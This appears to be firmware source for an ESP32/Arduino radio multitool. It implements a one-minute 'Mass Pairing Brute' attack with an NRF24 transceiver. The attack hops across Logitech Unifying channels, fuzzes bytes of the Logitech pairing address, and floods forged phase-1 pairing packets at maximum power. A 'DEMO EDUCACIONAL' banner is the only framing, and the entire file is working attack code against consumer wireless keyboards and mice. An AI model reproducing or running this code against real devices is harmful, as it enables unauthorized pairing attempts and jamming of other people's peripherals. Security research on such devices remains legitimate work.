#include <Arduino.h>
#include "nrf_mass_pairing.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "nrf_common.h"

using namespace nrf_common;

void nrf_mass_pairing() {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 not found");
        vTaskDelay(500 / portTICK_PERIOD_MS);
        return;
    }

    drawMainBorder();
    tft.setCursor(10, 35);
    tft.setTextSize(FM);
    tft.println("Mass Pairing Brute");
    tft.setTextSize(FP);

    displayWarning("DEMO EDUCACIONAL");
    delay(1500);

    if (CHECK_NRF_SPI(mode)) {
        NRFradio.setAutoAck(true);
        NRFradio.setPALevel(RF24_PA_MAX);
    }

    tft.setCursor(10, 60);
    tft.println("Flooding pairing requests...");

    uint32_t attempts = 0;

    uint32_t start_time = millis();
    while (!check(EscPress) && (millis() - start_time < 60000)) {
        if (CHECK_NRF_SPI(mode)) {
            // Logitech Unifying uses specific channels (5, 23, etc)
            int logi_channels[] = {5, 23, 24, 73, 76, 78};
            NRFradio.setChannel(logi_channels[attempts % 6]);

            // Logitech Pairing address base: BB:0A:DC:A5:75, Microsoft base varies
            uint8_t target_mac[5] = {0xBB, 0x0A, 0xDC, 0xA5, 0x75};

            // Fuzz MAC bytes
            target_mac[3] = random(0, 256);
            target_mac[4] = random(0, 256);

            NRFradio.openWritingPipe(target_mac);

            // Phase 1 pairing req: 0x5F followed by random fuzzing
            uint8_t pair_payload[32];
            memset(pair_payload, random(0, 256), 32);
            pair_payload[0] = 0x5F; // Pairing phase 1 type
            pair_payload[1] = random(0, 256); // Random device sequence
            pair_payload[2] = random(0, 256); // Random device command

            NRFradio.write(pair_payload, 22);

            attempts++;

            if (attempts % 150 == 0) {
                tft.fillRect(10, 90, tftWidth - 20, 20, willyConfig.bgColor);
                tft.setCursor(10, 90);
                tft.printf("Attempts: %d", attempts);
            }
        }

        if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) {
             NRFSerial.println("PAIR_B");
        }

        vTaskDelay(1 / portTICK_PERIOD_MS);
    }

    if (CHECK_NRF_UART(mode) || CHECK_NRF_BOTH(mode)) NRFSerial.println("OFF");
}
